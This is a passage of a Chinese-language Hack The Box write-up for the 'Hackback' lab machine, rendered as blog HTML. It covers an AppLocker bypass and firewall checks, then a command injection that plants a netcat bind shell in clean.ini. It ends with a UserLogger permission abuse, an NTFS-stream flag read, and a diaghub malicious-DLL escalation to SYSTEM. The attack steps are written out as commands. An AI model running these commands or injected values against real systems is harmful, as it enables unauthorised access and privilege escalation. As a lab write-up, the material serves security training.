upload_command[<span class="number">2</span>]) <span class="keyword">do</span> <span class="params">|bytes_copied, total_bytes, local_path, remote_path|</span>                                                                                                         </span><br><span class="line">                puts(<span class="string">&quot;<span class="subst">#&#123;bytes_copied&#125;</span> bytes of <span class="subst">#&#123;total_bytes&#125;</span> bytes copied&quot;</span>)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            command = <span class="string">&quot;echo `nOK`n&quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print(stdout)</span><br><span class="line">            STDERR.print(stderr)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    puts(<span class="string">&quot;Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>通过代理执行winrm_shell.rb</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ruby winrm_shell.rb</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/57.png"><br>成功上线 simple 用户</p>
+<h2 id="0x03-权限提升-hacker"><a href="#0x03-权限提升-hacker" class="headerlink" title="0x03 权限提升[hacker]"></a>0x03 权限提升[hacker]</h2><h3 id="查看本地环境"><a href="#查看本地环境" class="headerlink" title="查看本地环境"></a>查看本地环境</h3><p><strong>powershell环境</strong><br>查看当前语言环境为完整的语言模式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$executioncontext</span>.sessionstate.languagemode</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/58.png"><br><strong>AppLocker绕过</strong><br>上传 nc.exe 到<code>\windows\system32\spool\drivers\color</code>目录下，用于绕过 AppLocker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD /root/hackthebox/Machines/Hackback/nc.exe C:\Windows\system32\spool\drivers\color\nc.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/59.png"><br>在本地开启nc监听443端口，但是无法回连</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Windows\system32\spool\drivers\color\nc.exe 10.10.14.14 443</span><br></pre></td></tr></table></figure>
+<p><strong>防火墙限制</strong><br>查看防火墙是否对出口流量作出了限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c <span class="string">&quot;netsh advfirewall show currentprofile&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/60.png"></p>
+<p>防火墙默认设置是阻止进出，查看对应的规则</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c <span class="string">&quot;netsh advfirewall firewall show rule name=all&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/61.png"><br>显示存在两个规则：ping、web，其中 web 端口包括80、6666和64831，因此我们只能通过这几个端口出口流量</p>
+<h3 id="查看目录文件"><a href="#查看目录文件" class="headerlink" title="查看目录文件"></a>查看目录文件</h3><p>查看根目录，重点关注<code>util</code>目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/62-1.png"><br>查看该目录下的所有文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\util -force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/62.png"><br>重点关注隐藏文件夹<code>scripts</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\util\scripts</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/63.png"><br>发现 log.txt 和 batch.log 今天还在更新，而 dellog.ps1 是一个脚本。我们只能查看log.txt，而 batch.log 和 dellog.ps1 没有权限查看<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/64.png"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/65.png"></p>
+<h3 id="命令注入完成nc上线"><a href="#命令注入完成nc上线" class="headerlink" title="命令注入完成nc上线"></a>命令注入完成nc上线</h3><p>检查文件 clean.ini，猜测是 dellog.ps1 的参数文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/66.png"><br>dellog.ps1 执行时会把 clean.ini 中的内容作为参数执行，因此这里存在命令注入漏洞。我们可以编辑 clean.ini，向其中写入命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> [Main] &gt; C:\util\scripts\clean.ini</span><br><span class="line"><span class="built_in">echo</span> Lifetime=100 &gt;&gt; C:\util\scripts\clean.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;LogFile=c:\util\scripts\log.txt &amp; cmd.exe /c c:\\Windows\system32\spool\drivers\color\nc.exe -lvp 2222 -e cmd.exe&quot;</span> &gt;&gt; C:\util\scripts\clean.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Directory=c:\inetpub\logs\logfiles&quot;</span> &gt;&gt; C:\util\scripts\clean.ini</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/67.png"><br>成功写入命令，过五分钟左右监听器会启动，通过代理 nc 可连接目标</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc 10.10.10.128 2222</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/68.png"><br>成功获取shell</p>
+<h3 id="读取user-txt"><a href="#读取user-txt" class="headerlink" title="读取user.txt"></a>读取user.txt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\hacker\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\hacker\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/69.png"><br>成功拿到第一个flag</p>
+<h2 id="0x04-权限提升-system"><a href="#0x04-权限提升-system" class="headerlink" title="0x04 权限提升[system]"></a>0x04 权限提升[system]</h2><h3 id="分析UserLogger服务"><a href="#分析UserLogger服务" class="headerlink" title="分析UserLogger服务"></a>分析UserLogger服务</h3><p>通过枚举，可以发现存在一个不认识的服务<code>UserLogger</code>，在注册表查看该服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\userlogger</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/70.png"><br>启动服务<code>UserLogger</code>，指定目录为<code>c:\mac</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start userlogger c:\mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/71.png"><br>查看根目录发现 mac.log 已经生成，查看该日志文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/72.png"><br>查看文件权限，为 everyone</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls C:\mac.log</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/73.png"><br>经过分析这个服务可以将输入路径的最后一个文件名拼接上.log，同时修改文件的权限。由于windows的文件名不接受:，可以在文件名最后加上:进行截断，也就是当它读取.log的所有内容时，:将被删除，新权限将被应用到文件名上。</p>
+<h3 id="NTFS数据流读取root-txt"><a href="#NTFS数据流读取root-txt" class="headerlink" title="NTFS数据流读取root.txt"></a>NTFS数据流读取root.txt</h3><p>那么可以尝试读取root.txt。首先进入administrator目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc start userlogger <span class="string">&quot;c:\users\administrator:&quot;</span></span><br><span class="line">icacls c:\users\administrator</span><br><span class="line"><span class="built_in">cd</span> c:\users\administrator</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/74.png"><br>成功进入，接下来读取root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop userlogger</span><br><span class="line">sc start userlogger <span class="string">&quot;c:\users\administrator\desktop\root.txt:&quot;</span></span><br></pre></td></tr></table></figure>
+<p>如果在 cmd 下直接读取是读取不到的，需要转换到 powershell 命令窗口才可以看到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poweshell</span><br><span class="line">copy c:\users\administrator\desktop\root.txt .</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/74-1.png"><br>该文件不是我们想要的，应该需要使用ntfs数据流来进行读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Item c:\users\administrator\root.txt -force -stream *</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/74-2.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat c:\users\administrator\root.txt:flag.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/74-3.png"><br>成功获取第二个flag</p>
+<h3 id="恶意dll上线system"><a href="#恶意dll上线system" class="headerlink" title="恶意dll上线system"></a>恶意dll上线system</h3><p>在2018年4月，Google的<code>Project Zero</code>发表文章，谈论 diaghub 服务可以指示 system32 以system身份从内部加载dll，那么当它加载时，不会检查文件的扩展名，所以只要写入一个 dll 到 system32 中，就可以要求 diaghub 加载它。鉴于此，我可以使用与 system 相同的路径，通过 userlogger 写入 system32，将恶意dll放入log文件中，然后调用 diaghub 来加载它。</p>
+<p><em><strong>exp源地址：<a target="_blank" rel="noopener" href="https://github.com/decoder-it/diaghub_exploit">https://github.com/decoder-it/diaghub_exploit</a></strong></em></p>
+<p>开始制作恶意 dll 文件，在此需要使用到 Visual Stdio，将上述文件夹打开并生成，选择JSK为10.0.17736.0<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/75.png"><br>成功生成项目<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/76.png"><br>在shell中将以下代码写入 mac.bat 中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\spool\drivers\color\nc.exe -l -p 5555 -e cmd.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/77.png"><br>在 FakeDLL.cpp 中修改命令代码为本地执行bat脚本路径<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/78.png"><br>点击重新生成即可<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/79.png"><br>同理在 diaghub_exploit.cpp 中修改执行的目录环境，用于绕过 AppLocker 应用策略<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/80.png"><br>点击重新生成，然后在目录中找到 diaghub_exploit.exe 和 FakeDll.dll<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/81.png"><br>把它们上传到<code>C:\Windows\system32\spool\drivers\color\</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD diaghub_exploit.exe C:\Windows\system32\spool\drivers\color\mac.exe</span><br><span class="line">UPLOAD FakeDll.dll C:\Windows\system32\spool\drivers\color\FakeDll.dll</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/82.png"><br>进入 powershell 命令行开启 UserLogger，并将 FakeDll.dll 拷贝到<code>C:\windows\system32\</code>目录下 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd /c  <span class="string">&quot;sc.exe start userlogger C:\windows\system32\mac&quot;</span></span><br><span class="line">copy C:\Windows\system32\spool\drivers\color\FakeDll.dll C:\windows\system32\mac.log</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/83.png"><br>但是显示进入失败，说明恶意dll文件未上传到<code>C:\windows\system32\</code>目录下，查看 mac.log</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls c:\windows\system32 | findstr mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/84.png"><br>在其中未直接生成log文件，观看 appsec 视频说是需要使用<code>Invoke-Expression</code>来完成写入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression <span class="string">&quot;sc.exe start UserLogger C:\windows\system32\mac&quot;</span></span><br></pre></td></tr></table></figure>
+<p>但是我还是没写入到<code>C:\windows\system32\</code>目录中，原来是nc的运行位数搞错了，需要上传64位的nc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD /root/hackthebox/Machines/Hackback/nc64.exe C:\Windows\system32\spool\drivers\color\nc.exe</span><br></pre></td></tr></table></figure>
+<p>再次执行可以看到 mac.log<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/85.png"><br>接下来就是将恶意dll程序复制到<code>C:\windows\system32\</code>目录并重命名为mac.log，然后执行运行exp程序即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\system32\spool\drivers\color\FakeDll.dll C:\windows\system32\mac.log</span><br><span class="line">C:\Windows\system32\spool\drivers\color\mac.exe mac.log</span><br></pre></td></tr></table></figure>
+<p>查看本地端口开放情况，如果开放了5555端口那么说明exp利用成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/86.png"></p>
+<p>最后通过代理连接可获取到system</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc 10.10.10.128 5555</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/87.png"><br>通过ntfs数据流获取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users\administrator\Desktop /a /r</span><br><span class="line"><span class="built_in">cd</span> c:\users\administrator\Desktop</span><br><span class="line">powershell -c Get-Content -stream root.txt:flag.txt</span><br></pre></td></tr></table></figure>
